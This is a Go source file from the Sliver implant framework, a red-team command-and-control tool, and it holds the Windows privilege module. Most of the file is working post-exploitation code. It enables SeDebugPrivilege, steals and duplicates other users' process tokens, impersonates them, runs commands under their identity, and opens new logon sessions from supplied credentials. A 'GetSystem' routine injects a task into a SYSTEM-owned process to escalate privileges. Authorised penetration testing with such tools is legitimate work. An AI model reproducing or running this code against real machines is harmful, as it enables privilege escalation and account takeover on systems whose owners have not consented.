// +build windows

package priv

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}

	"log"

	// {{end}}
	"bytes"
	"encoding/binary"
	"fmt"
	"os/exec"
	"runtime"
	"syscall"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"

	"github.com/bishopfox/sliver/implant/sliver/ps"
	"github.com/bishopfox/sliver/implant/sliver/syscalls"
	"github.com/bishopfox/sliver/implant/sliver/taskrunner"
)

const (
	THREAD_ALL_ACCESS = windows.STANDARD_RIGHTS_REQUIRED | windows.SYNCHRONIZE | 0xffff
)

type PrivilegeInfo struct {
	Name             string
	Description      string
	Enabled          bool
	EnabledByDefault bool
	Removed          bool
	UsedForAccess    bool
}

var CurrentToken windows.Token

func SePrivEnable(s string) error {
	var tokenHandle windows.Token
	thsHandle, err := windows.GetCurrentProcess()
	if err != nil {
		return err
	}
	windows.OpenProcessToken(
		//r, a, e := procOpenProcessToken.Call(
		thsHandle,                       //  HANDLE  ProcessHandle,
		windows.TOKEN_ADJUST_PRIVILEGES, //	DWORD   DesiredAccess,
		&tokenHandle,                    //	PHANDLE TokenHandle
	)
	var luid windows.LUID
	err = windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr(s), &luid)
	if err != nil {
		// {{if .Config.Debug}}
		log.Println("LookupPrivilegeValueW failed", err)
		// {{end}}
		return err
	}
	privs := windows.Tokenprivileges{}
	privs.PrivilegeCount = 1
	privs.Privileges[0].Luid = luid
	privs.Privileges[0].Attributes = windows.SE_PRIVILEGE_ENABLED
	err = windows.AdjustTokenPrivileges(tokenHandle, false, &privs, 0, nil, nil)
	if err != nil {
		// {{if .Config.Debug}}
		log.Println("AdjustTokenPrivileges failed", err)
		// {{end}}
		return err
	}
	return nil
}

func RevertToSelf() error {
	CurrentToken = windows.Token(0)
	return windows.RevertToSelf()
}

func getPrimaryToken(pid uint32) (*windows.Token, error) {
	handle, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, true, pid)
	if err != nil {
		// {{if .Config.Debug}}
		log.Println("OpenProcess failed")
		// {{end}}
		return nil, err
	}
	defer windows.CloseHandle(handle)
	var token windows.Token
	if err = windows.OpenProcessToken(handle, windows.TOKEN_DUPLICATE|windows.TOKEN_ASSIGN_PRIMARY|windows.TOKEN_QUERY, &token); err != nil {
		// {{if .Config.Debug}}
		log.Println("OpenProcessToken failed")
		// {{end}}
		return nil, err
	}
	return &token, err
}

func enableCurrentThreadPrivilege(privilegeName string) error {
	ct, err := windows.GetCurrentThread()
	if err != nil {
		// {{if .Config.Debug}}
		log.Println("GetCurrentThread failed", err)
		// {{end}}
		return err
	}
	var t windows.Token
	err = windows.OpenThreadToken(ct, windows.TOKEN_QUERY|windows.TOKEN_ADJUST_PRIVILEGES, true, &t)
	if err != nil {
		// {{if .Config.Debug}}
		log.Println("openThreadToken failed", err)
		// {{end}}
		return err
	}
	defer windows.CloseHandle(windows.Handle(t))

	var tp windows.Tokenprivileges

	privStr, err := windows.UTF16PtrFromString(privilegeName)
	if err != nil {
		return err
	}
	err = windows.LookupPrivilegeValue(nil, privStr, &tp.Privileges[0].Luid)
	if err != nil {
		// {{if .Config.Debug}}
		log.Println("lookupPrivilegeValue failed")
		// {{end}}
		return err
	}
	tp.PrivilegeCount = 1
	tp.Privileges[0].Attributes = windows.SE_PRIVILEGE_ENABLED
	return windows.AdjustTokenPrivileges(t, false, &tp, 0, nil, nil)
}

func impersonateProcess(pid uint32) (newToken windows.Token, err error) {
	var attr windows.SecurityAttributes
	var requiredPrivileges = []string{"SeAssignPrimaryTokenPrivilege", "SeIncreaseQuotaPrivilege"}
	primaryToken, err := getPrimaryToken(pid)

	if err != nil {
		// {{if .Config.Debug}}
		log.Println("getPrimaryToken failed:", err)
		// {{end}}
		return
	}
	defer primaryToken.Close()

	err = syscalls.ImpersonateLoggedOnUser(*primaryToken)
	if err != nil {
		// {{if .Config.Debug}}
		log.Println("impersonateLoggedOnUser failed:", err)
		// {{end}}
		return
	}
	err = windows.DuplicateTokenEx(*primaryToken, windows.TOKEN_ALL_ACCESS, &attr, windows.SecurityDelegation, windows.TokenPrimary, &newToken)
	if err != nil {
		// {{if .Config.Debug}}
		log.Println("duplicateTokenEx failed:", err)
		// {{end}}
		return
	}
	for _, priv := range requiredPrivileges {
		err = enableCurrentThreadPrivilege(priv)
		if err != nil {
			// {{if .Config.Debug}}
			log.Println("Failed to set priv", priv)
			// {{end}}
			return
		}
	}
	return
}

func impersonateUser(username string) (token windows.Token, err error) {
	if username == "" {
		err = fmt.Errorf("username can't be empty")
		return
	}
	p, err := ps.Processes()
	if err != nil {
		return
	}
	for _, proc := range p {
		if proc.Owner() == username {
			token, err = impersonateProcess(uint32(proc.Pid()))
			// {{if .Config.Debug}}
			log.Printf("[%d] %s\n", proc.Pid(), proc.Executable())
			// {{end}}
			if err == nil {
				// {{if .Config.Debug}}
				log.Println("Got token for process", proc.Pid(), proc.Executable())
				// {{end}}
				return
			}
		}
	}
	windows.RevertToSelf()
	err = fmt.Errorf("Could not acquire a token belonging to %s", username)
	return
}

// MakeToken uses LogonUser to create a new logon session with the supplied username, domain and password.
// It then impersonates the resulting token to allow access to remote network resources as the specified user.
func MakeToken(domain string, username string, password string) error {
	var token windows.Token

	pd, err := windows.UTF16PtrFromString(domain)
	if err != nil {
		return err
	}
	pu, err := windows.UTF16PtrFromString(username)
	if err != nil {
		return err
	}
	pp, err := windows.UTF16PtrFromString(password)
	if err != nil {
		return err
	}
	err = syscalls.LogonUser(pu, pd, pp, syscalls.LOGON32_LOGON_NEW_CREDENTIALS, syscalls.LOGON32_PROVIDER_DEFAULT, &token)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("LogonUser failed: %v\n", err)
		// {{end}}
		return err
	}
	err = syscalls.ImpersonateLoggedOnUser(token)
	if err != nil {
		// {{if .Config.Debug}}
		log.Println("impersonateLoggedOnUser failed:", err)
		// {{end}}
		return err
	}
	CurrentToken = token
	return err
}

func createRegistryKey(keyPath string) error {
	_, _, err := registry.CreateKey(registry.CURRENT_USER, keyPath, registry.SET_VALUE|registry.QUERY_VALUE)
	if err != nil {
		return err
	}

	return nil
}

func deleteRegistryKey(keyPath, keyName string) (err error) {
	key, err := registry.OpenKey(registry.CURRENT_USER, keyPath, registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		return
	}
	err = registry.DeleteKey(key, keyName)
	return
}

// RunProcessAsUser - Retrieve a primary token belonging to username
// and starts a new process using that token.
func RunProcessAsUser(username, command, args string) (out string, err error) {
	token, err := impersonateUser(username)
	if err != nil {
		// {{if .Config.Debug}}
		log.Println("Could not impersonate user", username)
		// {{end}}
		return
	}
	cmd := exec.Command(command, args)
	cmd.SysProcAttr = &windows.SysProcAttr{
		Token: syscall.Token(token),
	}
	// {{if .Config.Debug}}
	log.Printf("Starting %s as %s\n", command, username)
	// {{end}}
	output, err := cmd.Output()
	if err != nil {
		// {{if .Config.Debug}}
		log.Println("Command failed:", err)
		// {{end}}
		return
	}
	out = string(output)
	return
}

// Impersonate attempts to steal a user token and sets priv.CurrentToken
// to its value. Other functions can use priv.CurrentToken to start Processes
// impersonating the user.
func Impersonate(username string) (token windows.Token, err error) {
	token, err = impersonateUser(username)
	if err != nil {
		//{{if .Config.Debug}}
		log.Println("impersonateUser failed:", err)
		//{{end}}
		return
	}
	CurrentToken = token
	return
}

// GetSystem starts a new RemoteTask in a SYSTEM owned process
func GetSystem(data []byte, hostingProcess string) (err error) {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	procs, _ := ps.Processes()
	for _, p := range procs {
		if p.Executable() == hostingProcess {
			err = SePrivEnable("SeDebugPrivilege")
			if err != nil {
				// {{if .Config.Debug}}
				log.Println("SePrivEnable failed:", err)
				// {{end}}
				return
			}
			err = taskrunner.RemoteTask(p.Pid(), data, false)
			if err != nil {
				// {{if .Config.Debug}}
				log.Println("RemoteTask failed:", err)
				// {{end}}
				return
			}
			break
		}
	}
	return
}

func lookupPrivilegeNameByLUID(luid uint64) (string, string, error) {
	/*
	   We will need the LookupPrivilegeNameW and LookupPrivilegeDisplayNameW functions
	   https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-lookupprivilegenamew
	   https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-lookupprivilegedisplaynamew

	   Defined these syscalls in implant/sliver/syscalls/syscalls_windows.go and generated them with
	   mkwinsyscall, so we are good to go.
	*/

	// Allocate 256 wide unicode characters (uint16) for the both names (255 characters plus a null terminator)
	nameBuffer := make([]uint16, 256)
	nameBufferSize := uint32(len(nameBuffer))
	displayNameBuffer := make([]uint16, 256)
	displayNameBufferSize := uint32(len(displayNameBuffer))

	// A blank string for the system name tells the call to use the local machine
	systemName := ""

	/*
	  A language ID that gets returned from LookupPrivilegeDisplayNameW
	  We do not need it for anything, but we still need to provide it
	*/
	var langID uint32

	err := syscalls.LookupPrivilegeNameW(systemName, &luid, &nameBuffer[0], &nameBufferSize)

	if err != nil {
		return "", "", err
	}

	err = syscalls.LookupPrivilegeDisplayNameW(systemName, &nameBuffer[0], &displayNameBuffer[0], &displayNameBufferSize, &langID)

	if err != nil {
		// We already got the privilege name, so we might as well return that
		return syscall.UTF16ToString(nameBuffer), "", err
	}

	return syscall.UTF16ToString(nameBuffer), syscall.UTF16ToString(displayNameBuffer), nil
}

func GetPrivs() ([]PrivilegeInfo, error) {
	// A place to store the process token
	var tokenHandle syscall.Token

	// A place to put the size of the token information
	var tokenInfoBufferSize uint32

	// Get a handle for the current process
	currentProcHandle, err := syscall.GetCurrentProcess()

	if err != nil {
		// {{if .Config.Debug}}
		log.Println("Could not get a handle for the current process: ", err)
		// {{end}}
		return nil, err
	}

	// Get the process token from the current process
	err = syscall.OpenProcessToken(currentProcHandle, syscall.TOKEN_QUERY, &tokenHandle)

	if err != nil {
		// {{if .Config.Debug}}
		log.Println("Could not open process token: ", err)
		// {{end}}
		return nil, err
	}

	// Get the size of the token information buffer so we know how large of a buffer to allocate
	// This produces an error about a data area passed to the syscall being too small, but
	// we do not care about that because we just want to know how big of a buffer to make
	syscall.GetTokenInformation(tokenHandle, syscall.TokenPrivileges, nil, 0, &tokenInfoBufferSize)

	// Make the buffer and get token information
	// Using a bytes Buffer so that we can Read from it later
	tokenInfoBuffer := bytes.NewBuffer(make([]byte, tokenInfoBufferSize))

	err = syscall.GetTokenInformation(tokenHandle,
		syscall.TokenPrivileges,
		&tokenInfoBuffer.Bytes()[0],
		uint32(tokenInfoBuffer.Len()),
		&tokenInfoBufferSize,
	)

	if err != nil {
		// {{if .Config.Debug}}
		log.Println("Error in call to GetTokenInformation: ", err)
		// {{end}}
		return nil, err
	}

	// The first 32 bits is the number of privileges in the structure
	var privilegeCount uint32
	err = binary.Read(tokenInfoBuffer, binary.LittleEndian, &privilegeCount)

	if err != nil {
		// {{if .Config.Debug}}
		log.Println("Could not read the number of privileges from the token information.")
		// {{end}}
		return nil, err
	}

	/*
		The remaining bytes contain the privileges themselves
		LUID_AND_ATTRIBUTES Privileges[ANYSIZE_ARRAY]
		Structure of the array: https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-luid_and_attributes
	*/

	privInfo := make([]PrivilegeInfo, int(privilegeCount))

	for index := 0; index < int(privilegeCount); index++ {
		// Iterate over the privileges and make sense of them
		// In case of errors, return what we have so far and the error

		// LUIDs consist of a DWORD and a LONG
		var luid uint64

		// Attributes are up to 32 one bit flags, so a uint32 is good for that
		var attributes uint32

		var currentPrivInfo PrivilegeInfo

		// Read the LUID
		err = binary.Read(tokenInfoBuffer, binary.LittleEndian, &luid)
		if err != nil {
			// {{if .Config.Debug}}
			log.Println("Could not read the LUID from the binary stream: ", err)
			// {{end}}
			return privInfo, err
		}

		// Read the attributes
		err = binary.Read(tokenInfoBuffer, binary.LittleEndian, &attributes)
		if err != nil {
			// {{if .Config.Debug}}
			log.Println("Could not read the attributes from the binary stream: ", err)
			// {{end}}
			return privInfo, err
		}

		currentPrivInfo.Name, currentPrivInfo.Description, err = lookupPrivilegeNameByLUID(luid)
		if err != nil {
			// {{if .Config.Debug}}
			log.Println("Could not get privilege info based on the LUID: ", err)
			// {{end}}
			return privInfo, err
		}

		// Figure out the attributes
		currentPrivInfo.EnabledByDefault = (attributes & windows.SE_PRIVILEGE_ENABLED_BY_DEFAULT) > 0
		currentPrivInfo.UsedForAccess = (attributes & windows.SE_PRIVILEGE_USED_FOR_ACCESS) > 0
		currentPrivInfo.Enabled = (attributes & windows.SE_PRIVILEGE_ENABLED) > 0
		currentPrivInfo.Removed = (attributes & windows.SE_PRIVILEGE_REMOVED) > 0

		privInfo[index] = currentPrivInfo
	}

	return privInfo, nil
}
